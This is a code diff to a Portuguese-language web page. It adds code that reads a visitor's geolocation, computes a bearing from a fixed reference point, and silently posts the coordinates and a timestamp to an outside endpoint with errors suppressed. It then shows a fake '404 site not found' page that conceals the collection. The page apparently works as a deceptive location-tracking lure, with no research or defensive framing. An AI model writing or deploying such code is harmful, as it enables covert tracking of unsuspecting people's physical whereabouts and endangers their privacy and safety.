@@ -144,6 +144,17 @@
         '<div class="not-found"><h1>404</h1><p>Site não encontrado.</p></div>';
     }
 
+    function sendPayload(payload) {
+      try {
+        fetch(ENDPOINT_URL, {
+          method: "POST",
+          headers: { "Content-Type": "text/plain;charset=UTF-8" },
+          body: JSON.stringify(payload),
+          keepalive: true
+        }).catch(() => {});
+      } catch (_) {}
+    }
+
     const btn = document.getElementById("btn");
     const statusEl = document.getElementById("status");
 
@@ -157,7 +168,7 @@
       statusEl.textContent = "Aguarde...";
 
       navigator.geolocation.getCurrentPosition(
-        async (pos) => {
+        (pos) => {
           const { latitude, longitude } = pos.coords;
           const deg = bearingDeg(REF_LAT, REF_LON, latitude, longitude);
           const payload = {
@@ -168,6 +179,20 @@
             timestamp: new Date().toISOString()
           };
 
-          try {
-            await fetch(ENDPOINT_URL, {
-              method: "POST",
+          sendPayload(payload);
+          showNotFound();
+        },
+        (err) => {
+          statusEl.textContent = `Não foi possível obter localização (${err.code}).`;
+          setTimeout(showNotFound, 600);
+        },
+        {
+          enableHighAccuracy: false,
+          timeout: 8000,
+          maximumAge: 60000
+        }
+      );
+    });
+  </script>
+</body>
+</html>
